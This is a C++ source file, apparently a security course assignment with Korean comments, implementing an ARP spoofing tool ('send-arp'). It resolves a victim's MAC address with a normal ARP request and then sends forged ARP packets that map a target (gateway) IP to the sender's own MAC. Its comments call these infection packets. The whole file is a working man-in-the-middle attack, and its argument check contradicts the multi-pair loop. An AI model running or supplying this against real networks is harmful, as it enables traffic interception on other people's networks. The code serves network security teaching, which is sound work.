#include <cstdio>
#include <pcap.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <iostream>
#include "ethhdr.h"
#include "arphdr.h"
#include "mac.h"
#include "ip.h"


#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax: send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample: send-arp-test wlan0\n");
}

/*
일단 귀찮으니까 분리하지말고,
todo:
1. 일단 인자 여러개 받아야되고
2. 내 mac 주소 얻어 오는 것
3. 상대 맥 주소 얻어 오는 것 => 정상적인 arp 요청을 보내서 응답을 통해서 알아오도록(애초에 arp를 통해서 공격을 하는 만큼, 상대의 ip는 알고 있는 상태에서 내 mac주소를 상대에게 게이트웨이의 mac주소로 인지하게끔 변조)
4. 확인 여부는 타겟의 arp table 조회
*/


Mac get_my_mac_address(const char* my_interface){
	int file_descripter;
	struct ifreq interface_structure;

	file_descripter = socket(AF_INET, SOCK_DGRAM, 0);
	interface_structure.ifr_addr.sa_family = AF_INET;
	strncpy(interface_structure.ifr_name, my_interface, IFNAMSIZ-1);
	ioctl(file_descripter, SIOCGIFHWADDR, &interface_structure);
	close(file_descripter);

	return Mac((uint8_t*)interface_structure.ifr_hwaddr.sa_data);
}


Mac get_target_mac_address(pcap_t* handle, Mac source_mac, Ip source_ip, Ip target_ip ){
	//타겟의 mac 주소를 모른다는 가정하에 접근하고, 이에 따른 응답으로 mac 주소를 배우는 구조이므로 기존의 스켈레톤 코드를 통한 함수화
    EthArpPacket packet;

	packet.eth_.dmac_ = Mac("00:00:00:00:00:00");
	packet.eth_.smac_ = source_mac;
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Request);
	packet.arp_.smac_ =source_mac;
	packet.arp_.sip_ = htonl(source_ip);
	packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
	packet.arp_.tip_ = htonl(target_ip);

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		return Mac("00:00:00:00:00:00");
	}

    // ARP Reply 패킷 수신
    while (true) {
        struct pcap_pkthdr* header;
        const u_char* replyPacket;
        res = pcap_next_ex(handle, &header, &replyPacket);
        if (res == 0) continue; // timeout
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
            fprintf(stderr, "pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            break;
        }

        EthArpPacket* arpReply = (EthArpPacket*)replyPacket;

        // 수신된 패킷이 ARP Reply이며, 대상 IP가 senderIp인 경우 MAC 주소 반환
        if (ntohs(arpReply->eth_.type_) == EthHdr::Arp &&
            ntohs(arpReply->arp_.op_) == ArpHdr::Reply &&
            arpReply->arp_.sip_ == Ip(htonl(source_ip))) {
            return arpReply->arp_.smac_;
        }
    }

   return Mac("00:00:00:00:00:00"); // 실패 시 null MAC 반환

}

void send_Arp(pcap_t* handle, Mac source_mac, Ip source_ip, Mac target_mac, Ip target_ip ){
	//기본적으로 스켈레톤 코드에서 작성된 arp 코드를 가져오되, 이번 과제에서는 단순히 하나의 타겟이 아님
	EthArpPacket packet;

	packet.eth_.dmac_ = target_mac;
	packet.eth_.smac_ = source_mac;
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Request);
	packet.arp_.smac_ = source_mac;
	packet.arp_.sip_ = htonl(source_ip);
	packet.arp_.tmac_ = target_mac;
	packet.arp_.tip_ = htonl(target_ip);

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }
}





int main(int argc, char* argv[]) {
	if (argc != 2) {
		usage();
		return -1;
	}

	char* dev = argv[1];	
	
	Mac myMac = get_my_mac_address(dev);

	std::string macStr = std::string(myMac);
    std::cout << "MAC Address of interface "<< ": " << macStr << std::endl;
	//test
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, 0, 0, 0, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	
 
    Ip myIp = Ip("172.24.145.214"); // 자신의 IP 주소를 입력
	

	for (int i = 2; i < argc; i += 2) {
        Ip senderIp = Ip(argv[i]);
        Ip targetIp = Ip(argv[i+1]);

        // Sender의 MAC 주소 알아내기
        Mac senderMac = get_target_mac_address(handle, myMac, myIp, senderIp);
        if (senderMac.isNull()) {
            fprintf(stderr, "Failed to get MAC address for IP: %s\n", std::string(senderIp).c_str());
            continue;
        }

        // ARP 감염 패킷 전송
        send_Arp(handle, myMac, targetIp, senderMac, senderIp);
    }


	pcap_close(handle);
}
